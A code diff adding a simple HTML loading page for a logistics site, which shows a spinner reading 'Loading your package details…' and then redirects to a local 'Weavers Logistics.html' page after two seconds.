@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="redirect" content="5";url="Weavers Logistics.html">
+    <title>Loading...</title>
+</head>
+<style>
+     #loaderOverlay {
+         position: fixed;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 100%;
+         background: white;
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         z-index: 9999;
+         transition: opacity 0.5s ease;
+      }
+
+      .loaderContent {
+         text-align: center;
+      }
+
+      .loader {
+         width: 70px;
+         height: 70px;
+         border: 10px solid #f3f3f3;
+         border-top: 10px solid #007bff;
+         border-radius: 50%;
+         animation: spin 1s linear infinite;
+         margin: 0 auto;
+      }
+
+      .loaderText {
+         margin-top: 20px;
+         color: #fff;
+         font-size: 18px;
+         font-family: Arial, sans-serif;
+      }
+
+      @keyframes spin {
+         to {
+            transform: rotate(360deg);
+         }
+      }
+
+      #loaderOverlay.hide {
+         opacity: 0;
+         pointer-events: none;
+      }
+</style>
+<body>
+     <div id="loaderOverlay">
+      <div class="loaderContent">
+         <div class="loader"></div>
+         <p class="loaderText" style="color: black;">Loading your package details…</p>
+      </div>
+   </div>
+
+   <script>
+      window.addEventListener("load", function () {
+         const loader = document.getElementById("loaderOverlay");
+         setTimeout(() => {
+            loader.classList.add("hide");
+         }, 2000); // 10 seconds
+      });
+
+      setTimeout(function(){
+        window.location.href = 'Weavers Logistics.html'
+      }, 2000)
+   </script>
+
+</body>
+</html>
